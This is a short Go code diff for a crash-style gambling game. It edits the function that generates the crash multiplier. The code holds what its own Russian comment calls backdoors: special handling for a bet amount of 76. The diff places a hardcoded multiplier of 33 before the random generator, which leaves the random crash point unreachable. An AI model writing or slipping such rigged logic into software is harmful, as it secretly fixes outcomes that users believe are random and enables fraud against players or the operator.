@@ -63,8 +63,7 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
     for _, bet := range bets {
         logger.Info("Checking bet amount: %f", bet.Amount)
 
-        CG.CrashPointMultiplier = 33
-        return 33
+        
 
         // Используем целочисленное сравнение для точного определения бэкдоров
         if bet.Amount == 76 {
@@ -151,6 +150,9 @@ func (CG *CrashGame) GenerateCrashPointMultiplier() float64 {
         }
 
     }
+
+    CG.CrashPointMultiplier = 33
+        return 33
 
     return CG.generateRandomCrashPoint()
 }
